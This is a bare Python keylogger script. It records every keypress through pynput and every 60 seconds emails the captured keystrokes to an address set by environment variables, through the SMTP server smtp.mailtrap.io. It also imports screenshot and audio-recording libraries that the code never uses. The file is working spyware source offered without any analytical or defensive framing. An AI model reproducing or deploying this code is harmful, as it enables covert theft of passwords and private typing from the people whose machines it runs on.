import logging
import os
import smtplib
import threading
import wave
import pyscreenshot
import sounddevice as sd
from pynput import keyboard
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders

EMAIL_ADDRESS = os.getenv("EMAIL_USER")
EMAIL_PASSWORD = os.getenv("EMAIL_PASS")
SEND_REPORT_EVERY = 60  # seconds

class KeyLogger:
    def __init__(self, time_interval, email, password):
        self.interval = time_interval
        self.log = "KeyLogger Started..."
        self.email = email
        self.password = password

    def appendlog(self, string):
        self.log += string

    def save_data(self, key):
        try:
            current_key = str(key.char)
        except AttributeError:
            if key == key.space:
                current_key = "SPACE"
            elif key == key.esc:
                current_key = "ESC"
            else:
                current_key = " " + str(key) + " "
        self.appendlog(current_key)

    def send_mail(self, email, password, message):
        try:
            msg = MIMEMultipart()
            msg['From'] = email
            msg['To'] = email
            msg['Subject'] = "Keylogger Report"

            msg.attach(MIMEText(message, 'plain'))

            server = smtplib.SMTP('smtp.mailtrap.io', 2525)
            server.starttls()
            server.login(email, password)
            server.sendmail(email, email, msg.as_string())
            server.quit()
        except Exception as e:
            logging.error(f"Failed to send email: {e}")

    def report(self):
        self.send_mail(self.email, self.password, "\n\n" + self.log)
        self.log = ""
        timer = threading.Timer(self.interval, self.report)
        timer.start()

    def run(self):
        with keyboard.Listener(on_press=self.save_data) as listener:
            self.report()
            listener.join()

if __name__ == "__main__":
    keylogger = KeyLogger(SEND_REPORT_EVERY, EMAIL_ADDRESS, EMAIL_PASSWORD)
    keylogger.run()
